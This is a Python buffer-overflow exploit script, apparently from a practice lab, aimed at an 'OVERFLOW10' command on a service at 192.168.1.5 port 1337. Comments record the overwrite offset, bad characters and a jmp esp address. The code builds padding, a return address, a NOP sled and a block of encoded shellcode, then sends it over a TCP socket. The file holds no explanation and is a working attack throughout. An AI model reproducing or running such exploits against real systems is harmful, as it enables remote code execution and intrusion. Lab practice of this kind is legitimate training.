#!/usr/bin/python3

import socket
import sys


host = "192.168.1.5"
port = 1337

prefix = "OVERFLOW10 "
offset= 537
crashed = 600
size = 1000
payload = ''
try :
	#  msf-pattern_create -l 600                                                                                                                                       130 ⨯
	# msf_pattern_create ="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"
	# 41397241 [*] Exact match at offset 537

	# badchars= \x00\xa0\xad\xbe\xde\xef

	# badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
	

		# 625011D3 jmp esp == >  \xD3\x11\x50\x62
	
	
	buf =  ""
	buf += "\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
	buf += "\x76\x0e\x6f\x49\xc4\x22\x83\xee\xfc\xe2\xf4\x93\xa1"
	buf += "\x46\x22\x6f\x49\xa4\xab\x8a\x78\x04\x46\xe4\x19\xf4"
	buf += "\xa9\x3d\x45\x4f\x70\x7b\xc2\xb6\x0a\x60\xfe\x8e\x04"
	buf += "\x5e\xb6\x68\x1e\x0e\x35\xc6\x0e\x4f\x88\x0b\x2f\x6e"
	buf += "\x8e\x26\xd0\x3d\x1e\x4f\x70\x7f\xc2\x8e\x1e\xe4\x05"
	buf += "\xd5\x5a\x8c\x01\xc5\xf3\x3e\xc2\x9d\x02\x6e\x9a\x4f"
	buf += "\x6b\x77\xaa\xfe\x6b\xe4\x7d\x4f\x23\xb9\x78\x3b\x8e"
	buf += "\xae\x86\xc9\x23\xa8\x71\x24\x57\x99\x4a\xb9\xda\x54"
	buf += "\x34\xe0\x57\x8b\x11\x4f\x7a\x4b\x48\x17\x44\xe4\x45"
	buf += "\x8f\xa9\x37\x55\xc5\xf1\xe4\x4d\x4f\x23\xbf\xc0\x80"
	buf += "\x06\x4b\x12\x9f\x43\x36\x13\x95\xdd\x8f\x16\x9b\x78"
	buf += "\xe4\x5b\x2f\xaf\x32\x21\xf7\x10\x6f\x49\xac\x55\x1c"
	buf += "\x7b\x9b\x76\x07\x05\xb3\x04\x68\xb6\x11\x9a\xff\x48"
	buf += "\xc4\x22\x46\x8d\x90\x72\x07\x60\x44\x49\x6f\xb6\x11"
	buf += "\x72\x3f\x19\x94\x62\x3f\x09\x94\x4a\x85\x46\x1b\xc2"
	buf += "\x90\x9c\x53\x48\x6a\x21\x04\x8a\x6e\x40\xac\x20\x6f"
	buf += "\x4d\x16\xab\x89\x23\xd4\x74\x38\x21\x5d\x87\x1b\x28"
	buf += "\x3b\xf7\xea\x89\xb0\x2e\x90\x07\xcc\x57\x83\x21\x34"
	buf += "\x97\xcd\x1f\x3b\xf7\x07\x2a\xa9\x46\x6f\xc0\x27\x75"
	buf += "\x38\x1e\xf5\xd4\x05\x5b\x9d\x74\x8d\xb4\xa2\xe5\x2b"
	buf += "\x6d\xf8\x23\x6e\xc4\x80\x06\x7f\x8f\xc4\x66\x3b\x19"
	buf += "\x92\x74\x39\x0f\x92\x6c\x39\x1f\x97\x74\x07\x30\x08"
	buf += "\x1d\xe9\xb6\x11\xab\x8f\x07\x92\x64\x90\x79\xac\x2a"
	buf += "\xe8\x54\xa4\xdd\xba\xf2\x24\x3f\x45\x43\xac\x84\xfa"
	buf += "\xf4\x59\xdd\xba\x75\xc2\x5e\x65\xc9\x3f\xc2\x1a\x4c"
	buf += "\x7f\x65\x7c\x3b\xab\x48\x6f\x1a\x3b\xf7"

	payload += prefix
	payload += "A"*offset
	payload += "\xD3\x11\x50\x62"
	payload += "\x90"*16
	payload += buf
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,port))
	s.send(bytes(payload,"latin-1"))
	print ("[+] payload has been sent successfully")
	s.close()

except :

	print("[-] Host seems to be down")
	sys.exit()